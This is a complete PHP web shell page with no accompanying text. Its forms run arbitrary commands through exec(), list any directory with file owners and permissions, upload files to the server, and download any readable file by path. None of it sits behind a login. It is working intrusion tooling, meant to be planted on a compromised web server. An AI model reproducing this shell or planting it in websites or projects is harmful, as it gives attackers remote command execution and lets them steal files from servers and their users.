<html>
<body>
Execute command
<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
   <input type="text" name="exec" size="70" maxlength="500"> 
   <input type="submit" name="cmdsubmit">
</form>

<?php

function printPerms($file) {
	$mode = fileperms($file);
	if( $mode & 0x1000 ) { $type='p'; }
	else if( $mode & 0x2000 ) { $type='c'; }
	else if( $mode & 0x4000 ) { $type='d'; }
	else if( $mode & 0x6000 ) { $type='b'; }
	else if( $mode & 0x8000 ) { $type='-'; }
	else if( $mode & 0xA000 ) { $type='l'; }
	else if( $mode & 0xC000 ) { $type='s'; }
	else $type='u';
	$owner["read"] = ($mode & 00400) ? 'r' : '-';
	$owner["write"] = ($mode & 00200) ? 'w' : '-';
	$owner["execute"] = ($mode & 00100) ? 'x' : '-';
	$group["read"] = ($mode & 00040) ? 'r' : '-';
	$group["write"] = ($mode & 00020) ? 'w' : '-';
	$group["execute"] = ($mode & 00010) ? 'x' : '-';
	$world["read"] = ($mode & 00004) ? 'r' : '-';
	$world["write"] = ($mode & 00002) ? 'w' : '-';
	$world["execute"] = ($mode & 00001) ? 'x' : '-';
	if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
	if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
	if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
	$s=sprintf("%1s", $type);
	$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
	$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
	$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
	return $s;
}

?>

<?php
	# execute command
	if(isset($_POST['cmdsubmit'])){
		if(isset($_POST['exec'])){	
    		$cmd = $_POST['exec'];
    		exec($cmd,$result);
    		foreach($result as $print){
				$print = str_replace('<','&lt;',$print);
				echo $print . '<br>';
    		}
  		echo '</pre>';
	}
}
?>

Viewing dir 
<form method="post" action = "<?php echo $_SERVER['PHP_SELF'];?>">
	<input type ="text" name="dir" size="70" maxlength="500">
	<input type="submit" name="dirSubmit"> 
</form>

<!-- directories and files listing-->
<table class="table table-hover table-bordered">
    <thead>
      <tr>
        <th>Name</th>
        <th>Owner</th>
        <th>Permissions</th>
      </tr>
    </thead>
    <tbody>

<?php
	if(isset($_POST['dirSubmit'])){
		if(isset($_POST['dir'])){
			$dir = $_POST['dir'];
			$dirs = scandir($dir);
			foreach ($dirs as $value) {
				echo '<tr>';
				$value = str_replace('<','&lt;',$value);
				if(realpath($dir.'/'.$value))
					echo '<td>'.$value.'</td><td>'.posix_getpwuid(fileowner($dir.'/'.$value))['name'].'</td><td>'.printPerms($dir.'/'.$value).'</td>\n';
				echo '</tr>';
			}
		}
		echo '</tbody>';
		echo '</table>';
	}
?>


Upload file

<form method ="post" enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF'];?>">
	<input type="file" name="fileUpload">
	<input type="submit" name="fileSubmit">
</form>
<?php
	if(isset($_POST["fileSubmit"])&&isset($_FILES["fileUpload"])){
		
		$file = $_FILES["fileUpload"]["name"];
		if(file_exists($file)){
			echo "File existed!<br>";
		}else if(move_uploaded_file($_FILES["fileUpload"]["tmp_name"],getcwd().'/'.$file)){
			echo "Succesfull upload file!!!<br><br>";
		}else{
			echo "Error uploading file!<br>";
		}
    }
    echo '<br>';
?>

Download file

<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
    <input type="text" name="downloadFile">
    <input type="submit" name="download" value="Download">
</form>

<?php

    
    if (isset($_POST['download'])&&isset($_POST['downloadFile'])) {
    	$file = $_POST['downloadFile'];
	    if (file_exists($file)) {
	        header('Content-Description: File Transfer');
	        header('Content-Type: application/octet-stream');
	        header('Content-Disposition: attachment; filename="'.basename($file).'"');
	        header('Expires: 0');
	        header('Cache-Control: must-revalidate');
	        header('Pragma: public');
	        header('Content-Length: ' . filesize($file));
	        readfile($file);
	        exit;
	    }
    }   

?>

</body>
</html>
